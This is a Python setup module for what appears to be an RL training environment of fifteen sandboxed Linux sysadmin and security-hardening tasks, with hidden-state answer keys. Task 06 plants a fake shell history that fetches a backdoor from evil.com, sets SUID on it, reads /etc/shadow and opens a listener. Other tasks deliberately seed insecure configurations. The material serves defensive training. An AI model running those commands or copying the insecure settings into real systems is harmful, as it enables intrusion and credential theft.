import os
import time
import random
import stat
import subprocess
import socket
import shutil
import platform
from typing import Dict, Any


IS_LINUX = platform.system() == "Linux"

def _sandbox_path(sandbox_root: str, p: str) -> str:
    return os.path.join(sandbox_root, p.lstrip('/'))

def get_pid_file(sandbox_root: str) -> str:
    return f'/tmp/.openenv_pids_{os.path.basename(sandbox_root)}'

# Per-worker PID file: avoids cross-contamination in parallel RL training

def _track_pid(pid: int, sandbox_root: str):
    PID_FILE = get_pid_file(sandbox_root)
    with open(PID_FILE, 'a') as f:
        f.write(f"{pid}\n")

def _cleanup_pids(sandbox_root: str):
    PID_FILE = get_pid_file(sandbox_root)
    if os.path.exists(PID_FILE) and IS_LINUX:
        import signal
        with open(PID_FILE, 'r') as f:
            for line in f:
                try:
                    pid = int(line.strip())
                    os.kill(pid, signal.SIGKILL)
                except Exception:
                    pass
        # Reap orphaned zombies — critical when Python is PID 1 in Docker
        # (the kernel will not auto-reap them otherwise)
        try:
            while True:
                pid, _ = os.waitpid(-1, os.WNOHANG)
                if pid == 0:
                    break
        except ChildProcessError:
            pass
        try:
            os.remove(PID_FILE)
        except Exception:
            pass


def setup_task_01(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Stale Temp Purge: create stale + recent files in /tmp."""
    random.seed(seed)
    now = time.time()
    stale_mtime = now - (8 * 86400)
    recent_mtime = now - (1 * 86400)

    stale_files = []
    for i in range(10):
        ext = random.choice(['.tmp', '.sess', '.cache', '.pid'])
        dir_path = _sandbox_path(sandbox_root, f"/tmp/dir_{random.randint(0,2)}")
        os.makedirs(dir_path, exist_ok=True)
        fpath = os.path.join(dir_path, f"stale_{i}{ext}")
        linux_path = f"/tmp/dir_{random.randint(0,2)}/stale_{i}{ext}"
        with open(fpath, 'w') as f:
            f.write("stale data")
        os.utime(fpath, (stale_mtime, stale_mtime))
        stale_files.append(fpath)

    recent_files = []
    for i in range(3):
        fpath = _sandbox_path(sandbox_root, f"/tmp/recent_{i}.tmp")
        os.makedirs(os.path.dirname(fpath), exist_ok=True)
        with open(fpath, 'w') as f:
            f.write("recent data")
        os.utime(fpath, (recent_mtime, recent_mtime))
        recent_files.append(fpath)

    # Create a protected lock file (simulates open file descriptor)
    lock_path = _sandbox_path(sandbox_root, "/tmp/session.lock")
    with open(lock_path, 'w') as f:
        f.write("locked by PID 1234")

    return {
        "task_id": 1,
        "stale_files": stale_files,
        "protected_file": lock_path,
        "recent_files": recent_files,
        "optimal_steps": 5,
    }


def setup_task_02(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Network Service Audit: misconfigured DNS + firewall + SSH ciphers."""
    random.seed(seed)
    port = random.choice([8080, 8443, 3000])

    # /etc/hosts with wrong IP for the service
    etc = _sandbox_path(sandbox_root, "/etc")
    os.makedirs(etc, exist_ok=True)
    with open(os.path.join(etc, "hosts"), "w") as f:
        f.write(f"127.0.0.1 localhost\n192.168.1.99 myservice.local\n")

    # sshd_config with weak ciphers
    ssh_dir = _sandbox_path(sandbox_root, "/etc/ssh")
    os.makedirs(ssh_dir, exist_ok=True)
    with open(os.path.join(ssh_dir, "sshd_config"), "w") as f:
        f.write(f"Port 22\nCiphers aes128-cbc,3des-cbc\nPermitRootLogin yes\n")

    # Firewall rules blocking the service port
    fw_dir = _sandbox_path(sandbox_root, "/etc/iptables")
    os.makedirs(fw_dir, exist_ok=True)
    fw_path = os.path.join(fw_dir, "rules.v4")
    with open(fw_path, "w") as f:
        f.write(f"-A INPUT -p tcp --dport 22 -j ACCEPT\n"
                f"-A INPUT -p tcp --dport {port} -j DROP\n"
                f"-A INPUT -j DROP\n")

    return {
        "task_id": 2,
        "correct_ip": "10.0.0.5",
        "service_hostname": "myservice.local",
        "port": port,
        "weak_ciphers": ["aes128-cbc", "3des-cbc"],
        "fw_path": fw_path,
        "optimal_steps": 6,
    }


def setup_task_03(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """SSH Key Permissions: create a key with wrong perms."""
    random.seed(seed)
    home_dir = random.choice(['/home/alice', '/home/bob', '/home/deploy'])
    key_name = random.choice(['id_rsa', 'id_ed25519', 'deploy_key'])

    key_path = _sandbox_path(sandbox_root, os.path.join(home_dir, '.ssh', key_name))
    os.makedirs(os.path.dirname(key_path), exist_ok=True)
    with open(key_path, 'w') as f:
        f.write("-----BEGIN OPENSSH PRIVATE KEY-----\nFAKE_KEY_DATA\n-----END OPENSSH PRIVATE KEY-----\n")

    # Set wrong permissions (world-readable)
    try:
        os.chmod(key_path, 0o644)
    except Exception:
        pass

    return {
        "task_id": 3,
        "key_path": key_path,
        "target_mode": 0o600,
        "optimal_steps": 3,
    }


def setup_task_07(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Service Config Fix: wrong bind_address."""
    random.seed(seed)
    port = random.choice([9090, 4000, 7070])
    config_dir = _sandbox_path(sandbox_root, "/etc/myservice")
    os.makedirs(config_dir, exist_ok=True)
    config_path = os.path.join(config_dir, "myservice.conf")
    with open(config_path, 'w') as f:
        f.write(f"bind_address = 127.0.0.1\nport = {port}\n")

    return {
        "task_id": 7,
        "config_path": config_path,
        "correct_bind": '0.0.0.0',
        "port": port,
        "optimal_steps": 4,
    }


def setup_task_08(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """IP Ban: create access.log with attacker IP."""
    random.seed(seed)
    attacker_ip = f"192.168.1.{random.randint(100, 200)}"
    legit_ips = [f"10.0.0.{i}" for i in range(5)]

    log_dir = _sandbox_path(sandbox_root, "/var/log")
    os.makedirs(log_dir, exist_ok=True)
    with open(os.path.join(log_dir, "access.log"), 'w') as f:
        for _ in range(2000):
            f.write(f"{attacker_ip} GET / HTTP/1.1\n")
        for ip in legit_ips:
            for _ in range(10):
                f.write(f"{ip} GET /page HTTP/1.1\n")

    deny_path = _sandbox_path(sandbox_root, "/etc/hosts.deny")
    os.makedirs(os.path.dirname(deny_path), exist_ok=True)
    with open(deny_path, 'w') as f:
        pass  # empty file

    return {
        "task_id": 8,
        "attacker_ip": attacker_ip,
        "legit_ips": legit_ips,
        "abuse_threshold": 1000,
        "optimal_steps": 4,
    }


def setup_task_10(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Cron Job Fix: missing execute bit + PATH."""
    random.seed(seed)
    cron_dir = _sandbox_path(sandbox_root, "/var/spool/cron/crontabs")
    backup_dir = _sandbox_path(sandbox_root, "/opt/backup")
    bin_dir = _sandbox_path(sandbox_root, "/usr/local/bin")
    os.makedirs(cron_dir, exist_ok=True)
    os.makedirs(backup_dir, exist_ok=True)
    os.makedirs(bin_dir, exist_ok=True)

    cron_path = os.path.join(cron_dir, "root")
    with open(cron_path, 'w') as f:
        f.write("PATH=/usr/bin:/bin\n*/5 * * * * /opt/backup/run_backup.sh\n")

    script_path = os.path.join(backup_dir, "run_backup.sh")
    with open(script_path, 'w') as f:
        f.write("#!/bin/bash\nbackup_util\n")
    # Missing execute bit (the bug)

    util_path = os.path.join(bin_dir, "backup_util")
    with open(util_path, 'w') as f:
        f.write("#!/bin/bash\necho ok\n")

    return {
        "task_id": 10,
        "bugs": ["missing_execute_bit", "path_missing_usr_local_bin"],
        "script_path": script_path,
        "cron_path": cron_path,
        "optimal_steps": 6,
    }


def setup_task_13(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """World-Writable Fix: config files with 777."""
    random.seed(seed)
    config_dir = _sandbox_path(sandbox_root, "/etc/myapp")
    os.makedirs(config_dir, exist_ok=True)

    vulnerable = []
    for fname in ['config.ini', 'settings.conf', 'db.conf']:
        path = os.path.join(config_dir, fname)
        with open(path, 'w') as fl:
            fl.write("[database]\nhost=localhost\n")
        try:
            os.chmod(path, 0o777)
        except Exception:
            pass
        vulnerable.append(path)

    intentional = os.path.join(config_dir, "socket.sock")
    with open(intentional, 'w') as f:
        f.write("socket")
    try:
        os.chmod(intentional, 0o777)
    except Exception:
        pass

    return {
        "task_id": 13,
        "vulnerable_files": vulnerable,
        "intentional_writable": intentional,
        "optimal_steps": 4,
    }


def setup_task_14(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """SSH Hardening: fix sshd_config."""
    random.seed(seed)
    ssh_dir = _sandbox_path(sandbox_root, "/etc/ssh")
    os.makedirs(ssh_dir, exist_ok=True)
    config_path = os.path.join(ssh_dir, "sshd_config")
    with open(config_path, 'w') as f:
        f.write("Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\nPubkeyAuthentication yes\n")

    return {
        "task_id": 14,
        "config_path": config_path,
        "target_root_login": "no",
        "target_password_auth": "no",
        "optimal_steps": 4,
    }


def setup_task_15(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Config Drift Detection: wrong env vars + drifted config files."""
    random.seed(seed)

    # App config with drifted values
    app_dir = _sandbox_path(sandbox_root, "/opt/myapp")
    os.makedirs(app_dir, exist_ok=True)
    config_path = os.path.join(app_dir, "config.yaml")
    with open(config_path, "w") as f:
        f.write("database_host: localhost\n"
                "database_port: 3306\n"
                "log_level: DEBUG\n"
                "max_connections: 5\n")

    # Gold version (what it should be)
    gold_dir = _sandbox_path(sandbox_root, "/var/lib/gold")
    os.makedirs(gold_dir, exist_ok=True)
    gold_path = os.path.join(gold_dir, "config.yaml")
    with open(gold_path, "w") as f:
        f.write("database_host: db.internal\n"
                "database_port: 5432\n"
                "log_level: WARN\n"
                "max_connections: 100\n")

    # .env file with wrong DB settings
    env_file = os.path.join(app_dir, ".env")
    with open(env_file, "w") as f:
        f.write("DB_HOST=localhost\nDB_PORT=3306\nAPP_ENV=development\n")

    # Wrong ownership marker
    owner_file = os.path.join(app_dir, ".owner")
    with open(owner_file, "w") as f:
        f.write("root:root")

    return {
        "task_id": 15,
        "config_path": config_path,
        "gold_path": gold_path,
        "env_file": env_file,
        "correct_db_host": "db.internal",
        "correct_db_port": "5432",
        "correct_owner": "appuser:appgroup",
        "optimal_steps": 6,
    }


# Stub tasks for Linux-only features (4,5,6,9,11,12) — return minimal hidden state
def _stub_task(task_id, seed, sandbox_root):
    return {"task_id": task_id, "optimal_steps": 5, "stub": True}

def setup_task_04(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Zombie Process Reaper."""
    random.seed(seed)
    target_parent_pid = None
    
    if IS_LINUX:
        pid = os.fork()
        if pid == 0:
            # Child: spawn 3 zombies and loop
            for _ in range(3):
                cpid = os.fork()
                if cpid == 0:
                    os._exit(0)
            while True:
                time.sleep(10)
        else:
            # Parent: verify child is still alive before starting episode
            time.sleep(0.2)
            c_pid, _ = os.waitpid(pid, os.WNOHANG)
            if c_pid == pid:
                raise RuntimeError(
                    f"Setup Failed: Zombie-parent process {pid} died immediately."
                )
            target_parent_pid = pid
            _track_pid(pid, sandbox_root)
            
    return {
        "task_id": 4,
        "target_parent_pid": target_parent_pid,
        "optimal_steps": 4,
    }

def setup_task_05(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Port Conflict Resolution."""
    random.seed(seed)
    target_port = random.randint(10000, 60000)
    rogue_pid = None
    
    if IS_LINUX:
        pid = os.fork()
        if pid == 0:
            import socket as _socket
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            s.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
            try:
                s.bind(('0.0.0.0', target_port))
                s.listen(1)
                while True:
                    time.sleep(10)
            except Exception:
                os._exit(1)
        else:
            # Vitality check: child must still be alive after binding attempt
            time.sleep(0.3)  # give child time to bind or crash
            c_pid, _ = os.waitpid(pid, os.WNOHANG)
            if c_pid == pid:
                raise RuntimeError(
                    f"Setup Failed: Port-binding process {pid} crashed "
                    f"(port {target_port} may already be in use)."
                )
            rogue_pid = pid
            _track_pid(pid, sandbox_root)

    config_dir = _sandbox_path(sandbox_root, "/etc")
    os.makedirs(config_dir, exist_ok=True)
    with open(os.path.join(config_dir, "myapp.conf"), "w") as f:
        f.write(f"server_name myapp\nprot={target_port}\n")
        
    return {
        "task_id": 5,
        "target_port": target_port,
        "rogue_pid": rogue_pid,
        "optimal_steps": 5,
    }
def setup_task_06(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Security Incident Response: brute-force + SUID exploit."""
    random.seed(seed)
    attacker = f"10.0.{random.randint(1,50)}.{random.randint(100,200)}"

    # Auth log with brute-force attempts
    log_dir = _sandbox_path(sandbox_root, "/var/log")
    os.makedirs(log_dir, exist_ok=True)
    with open(os.path.join(log_dir, "auth.log"), "w") as f:
        for i in range(200):
            f.write(f"Apr 25 10:{i%60:02d}:00 sshd: Failed password "
                    f"for root from {attacker} port 22\n")
        f.write(f"Apr 25 11:00:00 sshd: Accepted password "
                f"for compromised_user from {attacker}\n")

    # User history with suspicious commands
    hist_dir = _sandbox_path(sandbox_root, "/home/compromised_user")
    os.makedirs(hist_dir, exist_ok=True)
    with open(os.path.join(hist_dir, ".bash_history"), "w") as f:
        f.write("wget http://evil.com/backdoor.sh\nchmod 4755 /tmp/backdoor\n"
                "cat /etc/shadow\n./backdoor --listen 4444\n")

    # Rogue SUID binary
    tmp_dir = _sandbox_path(sandbox_root, "/tmp")
    os.makedirs(tmp_dir, exist_ok=True)
    suid_path = os.path.join(tmp_dir, "backdoor")
    with open(suid_path, "w") as f:
        f.write("#!/bin/bash\n# malicious payload\n")
    try:
        os.chmod(suid_path, 0o4755)
    except Exception:
        pass

    # Integrity manifest
    manifest_dir = _sandbox_path(sandbox_root, "/var/lib/integrity")
    os.makedirs(manifest_dir, exist_ok=True)
    with open(os.path.join(manifest_dir, "checksums.txt"), "w") as f:
        f.write("/usr/bin/passwd:OK\n/tmp/backdoor:MODIFIED\n")

    # /etc/passwd with compromised user having /bin/bash
    etc_dir = _sandbox_path(sandbox_root, "/etc")
    os.makedirs(etc_dir, exist_ok=True)
    passwd_path = os.path.join(etc_dir, "passwd")
    with open(passwd_path, "w") as f:
        f.write("root:x:0:0:root:/root:/bin/bash\n")
        f.write("compromised_user:x:1001:1001::/home/compromised_user:/bin/bash\n")

    # Empty hosts.deny
    with open(os.path.join(etc_dir, "hosts.deny"), "w") as f:
        pass

    return {
        "task_id": 6,
        "attacker_ip": attacker,
        "compromised_user": "compromised_user",
        "suid_path": suid_path,
        "passwd_path": passwd_path,
        "optimal_steps": 7,
    }
def setup_task_09(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Deleted-but-Open File (FD Leak)."""
    random.seed(seed)
    target_pid = None

    if IS_LINUX:
        pid = os.fork()
        if pid == 0:
            # Child: open a large file, then unlink it while still holding the FD
            log_path = _sandbox_path(sandbox_root, f"/tmp/leaked_{random.randint(1000,9999)}.log")
            os.makedirs(os.path.dirname(log_path), exist_ok=True)
            fh = open(log_path, "w")
            fh.write("A" * (50 * 1024 * 1024))
            fh.flush()
            os.unlink(log_path)
            while True:
                time.sleep(10)
        else:
            # Vitality check: give child time to complete I/O; crash = episode abort
            time.sleep(0.5)
            c_pid, _ = os.waitpid(pid, os.WNOHANG)
            if c_pid == pid:
                raise RuntimeError(
                    f"Setup Failed: FD-leak process {pid} crashed immediately."
                )
            target_pid = pid
            _track_pid(pid, sandbox_root)

    return {
        "task_id": 9,
        "target_pid": target_pid,
        "optimal_steps": 4,
    }

def setup_task_11(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Rogue SUID Binary Audit."""
    random.seed(seed)
    bin_dir = _sandbox_path(sandbox_root, "/usr/local/bin")
    os.makedirs(bin_dir, exist_ok=True)
    
    suid_file = os.path.join(bin_dir, f"helper_{random.randint(100,999)}")
    with open(suid_file, "w") as f:
        f.write("#!/bin/bash\necho 'suid helper'\n")
        
    try:
        os.chmod(suid_file, 0o4755)
    except Exception:
        pass
        
    return {
        "task_id": 11,
        "suid_files": [suid_file],
        "optimal_steps": 3,
    }

def setup_task_12(seed: int, sandbox_root: str) -> Dict[str, Any]:
    """Sudoers NOPASSWD Audit."""
    random.seed(seed)
    etc_dir = _sandbox_path(sandbox_root, "/etc")
    os.makedirs(etc_dir, exist_ok=True)
    
    sudoers_path = os.path.join(etc_dir, "sudoers")
    bad_entry = "backup ALL=(ALL) NOPASSWD: ALL"
    with open(sudoers_path, "w") as f:
        f.write("root ALL=(ALL) ALL\n")
        f.write("deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp\n")
        f.write(f"{bad_entry}\n")
        
    return {
        "task_id": 12,
        "bad_entries": [bad_entry],
        "optimal_steps": 4,
    }


def _force_remove_readonly(func, path, exc_info):
    """Error handler for shutil.rmtree on Windows: remove read-only flag and retry."""
    import stat as _stat
    os.chmod(path, _stat.S_IWRITE | _stat.S_IREAD)
    func(path)


def get_setup_for_task(task_id: int, seed: int, sandbox_root: str) -> Dict[str, Any]:
    _cleanup_pids(sandbox_root)
    # Clean sandbox before each episode
    if os.path.exists(sandbox_root):
        shutil.rmtree(sandbox_root, onerror=_force_remove_readonly)
    os.makedirs(sandbox_root, exist_ok=True)

    setups = {
        1: setup_task_01,
        2: setup_task_02,
        3: setup_task_03,
        4: setup_task_04,
        5: setup_task_05,
        6: setup_task_06,
        7: setup_task_07,
        8: setup_task_08,
        9: setup_task_09,
        10: setup_task_10,
        11: setup_task_11,
        12: setup_task_12,
        13: setup_task_13,
        14: setup_task_14,
        15: setup_task_15,
    }
    return setups[task_id](seed, sandbox_root)
